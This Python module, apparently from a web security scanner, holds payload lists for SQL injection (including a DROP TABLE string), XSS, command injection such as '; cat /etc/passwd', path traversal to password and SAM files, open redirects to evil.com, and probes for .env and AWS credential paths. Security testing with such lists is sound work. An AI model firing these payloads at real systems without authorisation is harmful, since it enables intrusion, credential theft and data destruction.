"""Payload lists for SQLi, XSS, command injection, path traversal, open redirect, etc."""

from typing import Dict, List

# SQL Injection
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "1' OR '1'='1' --",
    "1 OR 1=1",
    "'; DROP TABLE users--",
    "1' AND '1'='1",
    "' UNION SELECT NULL--",
    "1; SELECT * FROM users--",
    "admin'--",
    "' OR ''='",
]

# XSS
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "\"><script>alert(1)</script>",
    "'-alert(1)-'",
    "<body onload=alert(1)>",
    "<iframe src=\"javascript:alert(1)\">",
    "{{constructor.constructor('alert(1)')()}}",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
]

# Command / OS injection
CMD_INJECTION_PAYLOADS = [
    "; ls",
    "| ls",
    "& dir",
    "`id`",
    "$(id)",
    "; cat /etc/passwd",
    "| whoami",
    "\n/bin/ls",
    "& ping -c 3 127.0.0.1",
]

# Path / directory traversal
PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd",
    "file:///etc/passwd",
]

# Open redirect
OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "https://evil.com%0d%0a",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "/\\evil.com",
]

# IDOR-style parameter values (numeric / predictable)
IDOR_PAYLOADS = [
    "1", "0", "2", "100", "admin", "id=1", "user_id=1", "uid=0",
]

# Sensitive path probes (headers / config)
SENSITIVE_PATHS = [
    "/.env",
    "/.git/config",
    "/admin",
    "/api/admin",
    "/config.json",
    "/debug",
    "/backup",
    "/.aws/credentials",
    "/wp-config.php",
    "/web.config",
]


def get_payloads_for_category(category: str) -> List[str]:
    """Return payload list for a test category."""
    m: Dict[str, List[str]] = {
        "sql_injection": SQLI_PAYLOADS,
        "xss": XSS_PAYLOADS,
        "command_injection": CMD_INJECTION_PAYLOADS,
        "path_traversal": PATH_TRAVERSAL_PAYLOADS,
        "open_redirect": OPEN_REDIRECT_PAYLOADS,
        "idor": IDOR_PAYLOADS,
    }
    return m.get(category, [])
